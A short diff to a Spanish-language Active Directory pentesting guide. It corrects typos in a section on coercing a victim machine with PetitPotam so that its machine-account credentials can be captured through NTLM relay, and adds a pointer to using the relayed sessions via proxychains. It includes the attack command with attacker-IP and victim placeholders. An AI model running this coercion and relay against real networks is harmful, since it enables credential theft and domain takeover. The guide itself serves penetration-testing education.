@@ -1,4 +1,4 @@
-# Coercionar a la Víctima con PetitPotam
+# Coaccionar a la víctima con PetitPotam
 
 Si la vítima es vulnerable a petit potam podemos capturar las credenciales de la cuenta del equipo utilizando la técnica de NTLM RELAY:
 [NTLM_relay](no_credentials/NTLM_relay/)
@@ -22,6 +22,10 @@ python petitpotam.py <IP atacante> <DNS del equipo vísctima>
 
 ![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam2.png?raw=true "petitpotam")
 
-Resultad: (para ver las sesiones escribir "socks")
+Resultado: (para ver las sesiones escribir "socks")
 
 ![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam3.png?raw=true "NTLM relay petitpotam")
+
+Utilizar las sesiones con proxychain como se muestra en elste punto:
+
+[NTLM Relay](../no_credentials/NTLM_relay//README.md#Redirigir-las-credenciales)
